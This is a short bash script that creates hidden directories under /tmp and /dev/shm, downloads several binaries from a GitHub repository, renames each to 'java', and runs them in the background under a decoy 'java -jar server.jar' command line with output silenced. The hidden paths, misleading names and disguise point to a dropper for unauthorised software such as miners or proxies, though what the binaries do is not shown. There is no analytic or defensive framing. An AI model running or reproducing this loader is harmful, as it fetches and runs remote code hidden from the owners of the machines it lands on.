#!/bin/bash

function fetch_files() {
    mkdir -p /tmp/.java/bin/{.a,.b,.c} /dev/shm/.cahe/{etc,log}
    cd /tmp/.java/bin/ && curl -L https://github.com/i51jir6ni9t0/backup/releases/download/v0.1/uid-amd64-v0.1.3 -o uid
    cd /tmp/.java/bin/ && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/supervisord -o java
    cd /dev/shm/.cahe/etc && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/tmp/pingu/n1.conf -o supervisord.conf
    cd /tmp/.java/bin/.a && curl -L https://github.com/i51jir6ni9t0/backup/releases/download/v0.1/chsl-v1.11.5-amd64 -o java
    cd /tmp/.java/bin/.b && curl -L https://github.com/i51jir6ni9t0/backup/releases/download/v0.1/rs-kfi-ml-v0.2.9-amd64-musl -o java
    cd /tmp/.java/bin/.c && curl -L https://github.com/i51jir6ni9t0/backup/releases/download/v0.1/gnet-v1.4.43-amd64 -o java
    # echo /tmp/.java/bin/.a /tmp/.java/bin/.b /tmp/.java/bin/.c | xargs -n 1 cp /tmp/.java/bin/pm2
}

function start_app() {
    chmod a+x /tmp/.java/bin/*** /tmp/.java/bin/.a/** /tmp/.java/bin/.b/**  /tmp/.java/bin/.c/**
    cd /dev/shm/.cahe/log && nohup /tmp/.java/bin/uid ~~m ~~n 'java -Dterminal.jline=false -Dterminal.ansi=true -jar server.jar' ~~f /tmp/.java/bin/java >/dev/null 2>&1 &
}

if [ -f "/tmp/.java/bin/java" ] && [ -f "/tmp/.java/bin/.a/java" ] && [ -f "/tmp/.java/bin/.b/java" ]; then
    start_app
else
    rm -rf /tmp/.java/bin
    fetch_files
    start_app
fi